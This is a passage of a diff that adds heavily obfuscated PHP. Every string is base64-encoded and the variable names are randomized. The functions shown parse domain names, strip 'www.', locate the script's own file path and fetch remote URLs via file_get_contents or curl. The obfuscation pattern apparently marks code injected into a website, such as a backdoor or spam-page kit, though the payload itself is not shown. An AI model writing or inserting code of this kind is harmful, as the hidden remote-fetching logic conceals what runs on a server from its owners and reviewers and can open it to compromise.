+					base64_decode('Z292'),
+					base64_decode('aW5mbw=='),
+					base64_decode('am9icw=='),
+					base64_decode('bWls'),
+					base64_decode('bW9iaQ=='),
+					base64_decode('bXVzZXVt'),
+					base64_decode('bmFtZQ=='),
+					base64_decode('bmV0'),
+					base64_decode('b3Jn'),
+					base64_decode('cG9zdA=='),
+					base64_decode('cHJv'),
+					base64_decode('dGVs'),
+					base64_decode('dHJhdmVs'),
+					base64_decode('eHh4'),
+				);
+				if (count($tfxb00ea3d7900b7036) > 2 && in_array($jgkd41af18a5acb8c8c[0], $acn50641838fba9970d) !== false) 				{
+					array_shift($tfxb00ea3d7900b7036);
+				}
+			}
+		}
+		else 		{
+			for ($dpxd6cbb48444bf8cf4 = count($jgkd41af18a5acb8c8c); $dpxd6cbb48444bf8cf4 > 1; $dpxd6cbb48444bf8cf4--)
+			{
+				$wilb12b4282d32706d6 = array_shift($tfxb00ea3d7900b7036);
+			}
+		}
+	}
+	elseif (count($tfxb00ea3d7900b7036) === 2)
+	{
+		$qpcd42388f9aecfaaf4 = array_shift($tfxb00ea3d7900b7036);
+		if (strpos(join(base64_decode('Lg=='), $tfxb00ea3d7900b7036), base64_decode('Lg==')) === false
+			&& in_array($tfxb00ea3d7900b7036[0], array(base64_decode('bG9jYWxob3N0'),base64_decode('dGVzdA=='),base64_decode('aW52YWxpZA=='))) === false) 		{
+						array_unshift($tfxb00ea3d7900b7036, $qpcd42388f9aecfaaf4);
+		}
+	}
+	return join(base64_decode('Lg=='), $tfxb00ea3d7900b7036);
+}
+
+function remove_www ($gkp7ed21b04c0dcde1c)
+{
+  return str_ireplace (base64_decode('d3d3Lg=='), '', $gkp7ed21b04c0dcde1c); 
+}
+
+function estimate_current_path ()
+{
+  $mhr0fdcbaaa7db37016 = dirname(strtok($_SERVER[base64_decode('UkVRVUVTVF9VUkk=')], base64_decode('Pw==')));
+
+  if ($mhr0fdcbaaa7db37016 !== base64_decode('Lw=='))
+  {
+    return str_replace (dirname(strtok($_SERVER[base64_decode('UkVRVUVTVF9VUkk=')], base64_decode('Pw=='))), '', realpath(dirname(__FILE__)));
+  } else {
+    return realpath(dirname(__FILE__));
+  }
+}
+
+
+function url_get_contents ($kea8db64bce186cbad8)
+{
+  $nulc3976cff98ccc88c = preg_match (base64_decode('LzF8eWVzfG9ufHRydWUvaQ=='), ini_get (base64_decode('YWxsb3dfdXJsX2ZvcGVu')));
+  if ($nulc3976cff98ccc88c)
+  {
+    return file_get_contents($kea8db64bce186cbad8);
+  }
+  elseif (function_exists (base64_decode('Y3VybF9pbml0')))
+  {
+    $clw82d1643e18a4bd6d = curl_init ($kea8db64bce186cbad8);
+    curl_setopt ($clw82d1643e18a4bd6d, CURLOPT_RETURNTRANSFER, 1);
+    $exd80b15449d3040ffc = curl_exec ($clw82d1643e18a4bd6d);
+    curl_close ($clw82d1643e18a4bd6d);
+    if (is_string ($exd80b15449d3040ffc))
+    {
+      return $exd80b15449d3040ffc;
+    }
+  }
+  return false;
+}
+
+?>
